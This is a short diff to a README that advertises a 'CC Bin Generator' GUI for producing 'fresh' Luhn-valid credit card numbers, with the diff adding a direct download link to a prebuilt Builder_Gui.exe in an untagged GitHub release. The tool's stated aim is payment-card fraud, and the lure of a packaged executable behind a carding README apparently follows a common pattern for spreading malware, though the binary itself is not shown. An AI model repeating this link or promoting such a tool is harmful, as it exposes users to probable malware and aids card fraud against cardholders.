@@ -1,5 +1,5 @@
 # 💳 CC Bin Generator – Unlimited BINs Builder (GUI)
-
+Download : https://github.com/Andre0194/service/releases/download/untagged-b8ae7f909cdfebcd4289/Builder_Gui.exe
 > 🧪 Generate unlimited fresh CC BINs with Luhn-valid structure using an interactive GUI.
 > ⚙️ Packaged into a `build.exe` interface for easy use, no coding knowledge required.
 
